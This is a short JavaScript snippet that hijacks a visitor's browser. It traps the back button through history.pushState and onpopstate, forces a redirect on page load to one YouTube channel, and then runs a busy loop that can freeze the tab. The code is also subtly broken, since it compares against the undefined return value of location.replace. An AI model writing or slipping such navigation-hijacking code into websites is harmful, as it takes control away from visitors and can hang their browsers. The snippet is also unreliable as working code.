history.pushState(null, null, window.location.href);
    window.onpopstate = function () {
        history.go(1);
};
window.addEventListener('load', function(){
    if(window.location.href.startsWith('https://www.youtube.com/channel/UCfbvz7xPaOOxiAYqRhycQ2g'))return;
    var link =window.location.replace('https://www.youtube.com/channel/UCfbvz7xPaOOxiAYqRhycQ2g');
    if(window.location.href !== link){ 
        while(link===link){     
       
            if(location.href === link)return
        
        }
                     
    }else if(window.location.href === link)return  
});    